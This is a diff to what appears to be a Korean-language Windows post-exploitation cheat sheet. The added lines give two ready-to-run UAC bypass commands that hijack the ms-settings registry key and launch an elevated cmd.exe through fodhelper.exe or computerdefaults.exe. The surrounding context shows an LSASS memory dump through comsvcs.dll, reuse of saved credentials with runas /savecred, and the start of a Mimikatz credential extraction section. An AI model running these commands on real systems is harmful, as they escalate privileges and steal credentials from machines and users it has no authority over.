@@ -293,6 +293,17 @@ rundll32 C:\windows\system32\comsvcs.dll, MiniDump <PID> C:\lsass.dmp full
 ```C:\>cmdkey /list```
 - SRV01\mcharles 사용자 가장 : ```C:\>runas /savecred /user:SRV01\mcharles cmd```
 
+- UAC 우회(2가지 중 선택)
+```
+# fodhelper.exe 사용:
+
+> reg add HKCU\Software\Classes\ms-settings\shell\open\command /f /ve /t REG_SZ /d "cmd.exe" && start fodhelper.exe
+
+# computerdefaults.exe 사용:
+
+> reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ /d "" /f && reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /ve /t REG_SZ /d "cmd.exe" /f && start computerdefaults.exe
+```
+
 ### Mimikatz를 사용하여 자격 증명 추출
 ```
 C:\Users\Administrator\Desktop> mimikatz.exe
